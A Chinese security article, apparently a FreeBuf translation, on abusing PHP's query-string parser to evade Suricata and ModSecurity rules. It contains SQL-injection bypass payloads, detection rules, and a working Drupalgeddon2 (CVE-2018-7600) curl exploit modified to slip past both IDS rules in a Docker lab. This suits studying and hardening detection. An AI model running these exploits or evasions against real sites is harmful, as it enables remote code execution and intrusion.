FROM

```
https://www.freebuf.com/articles/web/213359.html
```



---

利用PHP的字符串解析特性Bypass

[FreeBuf_25425](https://www.freebuf.com/author/FreeBuf_25425)2019-09-29 13:00:371063519

 所属地 浙江省

**我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => "bar")。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：**

```
/news.php?%20news[id%00=42"+AND+1=0--
```

上述PHP语句的参数%20news[id%00的值将存储到$_GET["news_id"]中。

HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：

> 1.删除空白符
>
> 2.将某些字符转换为下划线（包括空格）

例如：

|  User input   | Decoded PHP | variable name |
| :-----------: | :---------: | :-----------: |
| %20foo_bar%00 |   foo_bar   |    foo_bar    |
| foo%20bar%00  |   foo bar   |    foo_bar    |
|   foo%5bbar   |   foo[bar   |    foo_bar    |

通过以下这个示例，你可以更直观的看到parser_str函数如何处理字符串：

![img](https://image.3001.net/images/20190904/1567560394_5d6f12cab5cdc.gif!small)

```
<?php
    foreach(
        [
            "{chr}foo_bar",
            "foo{chr}bar",
            "foo_bar{chr}"
        ] as $k => $arg) {
            for($i=0;$i<=255;$i++) {
                echo "\033[999D\033[K\r";
                echo "[".$arg."] check ".bin2hex(chr($i))."";
                parse_str(str_replace("{chr}",chr($i),$arg)."=bla",$o);
                /* yes... I've added a sleep time on each loop just for 
                the scenic effect :) like that movie with unrealistic 
                brute-force where the password are obtained 
                one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ 
                */
                usleep(5000);
                if(isset($o["foo_bar"])) {
                    echo "\033[999D\033[K\r";
                    echo $arg." -> ".bin2hex(chr($i))." (".chr($i).")\n";
                }
            }
            echo "\033[999D\033[K\r";
            echo "\n";
    }
```

![parse_str.gif](https://image.3001.net/images/20190909/15680192917012.gif!small)

parse_str函数通常被自动应用于get、post请求和cookie中。如果你的Web服务器接受带有特殊字符的参数名，那么也会发生类似的情况。如上代码所示，我进行了多次循环，枚举了参数名三个位置的0到255之间的所有字符，看看解析函数到底是如何处理这些特殊字符的。结果如下：

> 1.[1st]foo_bar
>
> 2.foo[2nd]bar
>
> 3.foo_bar[3rd]

![img](https://image.3001.net/images/20190904/1567560438_5d6f12f680afe.png!small)

![img](https://image.3001.net/images/20190904/1567560448_5d6f13004035f.png!small)

在上述方案中，foo%20bar和foo+bar等效，均解析为foo bar。

## Suricata

也许你也听过这款软件，Suricata是一个“开源、成熟、快速、强大的网络威胁检测引擎”，它的引擎能够进行实时入侵检测（IDS）、入侵防御系统（IPS）、网络安全监控（NSM）和离线流量包处理。

在Suricata中你可以自定义一个HTTP流量的检测规则。假设你有这样一个规则：

```
alert http any any -> $HOME_NET any (\
    msg: "Block SQLi"; flow:established,to_server;\
    content: "POST"; http_method;\
    pcre: "/news_id=[^0-9]+/Pi";\
    sid:1234567;\
)
```

简单来说，上述规则会检查news_id的值是否是数字。那么根据上述知识，我们可以很容易的绕过防御，如下所示：

```
/?news[id=1%22+AND+1=1--'
/?news%5bid=1%22+AND+1=1--'
/?news_id%00=1%22+AND+1=1--'
```

通过在Google和Github上进行搜索，我发现有很多关于Suricata规则可以通过替换下划线或插入空字符来绕过。一个真实的例子：https://github.com/OISF/suricata-update/blob/7797d6ab0c00051ce4be5ee7ee4120e81f1138b4/tests/emerging-current_events.rules#L805

```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET CURRENT_EVENTS Sakura exploit kit exploit download request /view.php"; flow:established,to_server; content:"/view.php?i="; http_uri; fast_pattern:only; pcre:"//view.php?i=\d&key=[0-9a-f]{32}$/U"; classtype:trojan-activity; sid:2015678; rev:2;)
```

上述规则可以通过以下方式绕过：

```
/view.php?i%00=1&%20key=d3b07384d113edec49eaa6238ad5ff00
```

当然，这条规则交换参数位置即可绕过，比如：

```
/view.php?key=d3b07384d113edec49eaa6238ad5ff00&i=1
```

## WAF（ModSecurity）

此外，PHP查询字符串的解析特性也可用以绕过WAF。想象一下,它的规则类似于SecRule !ARGS:news_id "@rx ^[0-9]+$" "block"，这显然可以通过相同的手段绕过。幸运的是，在ModSecurity中，可以通过正则表达式指定查询字符串中的参数。比如：

```
SecRule !ARGS:/news.id/ "@rx ^[0-9]+$" "block"
```

以上规则将拦截诸如以下的请求：

```
⛔️/?news[id=1%22+AND+1=1--'
⛔️/?news%5bid=1%22+AND+1=1--'
⛔️/?news_id%00=1%22+AND+1=1--'
```

## PoC || GTFO

让我们用Suricata和Drupal CMS创建一个以利用[CVE-2018-7600](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600)（Drupalgeddon2远程执行代码）的简单PoC。为了简单起见，我将在两个Docker容器上运行Suricata和Drupal，并尝试绕过Suricata攻击Drupal。

我将使用两条Suricata防御规则：

> 1.一条自定义规则拦截form_id=user_register_form
>
> 2.另一条是关于CVE-2018-7600的通用[规则](https://github.com/ptresearch/AttackDetection/tree/master/CVE-2018-7600)

![img](https://image.3001.net/images/20190904/1567560463_5d6f130fe4b66.png!small)

Suricata官方安装流程点击[这里](https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Ubuntu_Installation_-_Personal_Package_Archives_(PPA)。对于Drupal，我运行了一个Vulhub容器，你可以在[这里](https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600)下载：

![img](https://image.3001.net/images/20190904/1567560473_5d6f1319a7cb5.png!small)

首先，让我们尝试利用CVE-2018-7600。一个利用curl命令的小型bash脚本，比如：

```
#!/bin/bash
URL="/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
QSTRING="form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]="
COMMAND="id"
curl -v -d "${QSTRING}${COMMAND}" "http://172.17.0.1:8080$URL"
```

如你所见，上面的脚本将执行命令id：

![img](https://image.3001.net/images/20190904/1567560483_5d6f13234614b.png!small)

现在，让我们尝试往Suricata导入以下两条规则：我编写了第一个规则，它只是尝试form_id=user_register_form在请求体内进行匹配; Positive Technology /user/register在请求URL和#post_render请求正文中写了第二个匹配项。我的规则：

```
alert http any any -> $HOME_NET any (\
  msg: "Possible Drupalgeddon2 attack";\
  flow: established, to_server;\
  content: "/user/register"; http_uri;\
  content: "POST"; http_method;\
  pcre: "/form_id=user_register_form/Pi";\
  sid: 10002807;\
  rev: 1;\
)
```

通用规则：

```
alert http any any -> $HOME_NET any (\
  msg: "ATTACK [PTsecurity] Drupalgeddon2 <8.3.9 <8.4.6 <8.5.1 RCE through registration form (CVE-2018-7600)"; \
  flow: established, to_server; \
  content: "/user/register"; http_uri; \
  content: "POST"; http_method; \
  content: "drupal"; http_client_body; \
  pcre: "/(%23|#)(access_callback|pre_render|post_render|lazy_builder)/Pi"; \
  reference: cve, 2018-7600; \
  reference: url, research.checkpoint.com/uncovering-drupalgeddon-2; \
  classtype: attempted-admin; \
  reference: url, github.com/ptresearch/AttackDetection; \
  metadata: Open Ptsecurity.com ruleset; \
  sid: 10002808; \
  rev: 2; \
)
```

在重启Suricata后，我的攻击被成功报警：

可以看到，我们得到了两条日志：

> 1.ATTACK [PTsecurity] Drupalgeddon2 <8.3.9 <8.4.6 <8.5.1 RCE through registration form (CVE-2018-7600) [Priority: 1] {PROTO:006} 172.17.0.6:51702 -> 172.17.0.1:8080
>
> 2.Possible Drupalgeddon2 attack [Priority: 3] {PROTO:006} 172.17.0.6:51702 -> 172.17.0.1:8080

## Bypass！

这两条规则其实都很容易绕过。首先，对于敏感字段form_id=user_register_form，我们可将其替换为如下内容：

```
form%5bid=user_register_form
```

如上图所见，现在只有通用规则的警报。分析通用规则的正则表达式，我们可以看到它对#和%23敏感，但不涉及下划线的编码。因此，我们可以使用post%5frender代替post_render来绕过：

最后得出可绕过两个规则的PoC：

```
#!/bin/bash
URL="/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
QSTRING="form%5bid=user_register_form&_drupal_ajax=1&mail[#post%5frender][]=exec&mail[#type]=markup&mail[#markup]="
COMMAND="id"
curl -v -d "${QSTRING}${COMMAND}" "http://172.17.0.1:8080$URL"
```

***参考来源：[secjuice](https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/)，FB小编周大涛编译，转载请注明来自FreeBuf.COM**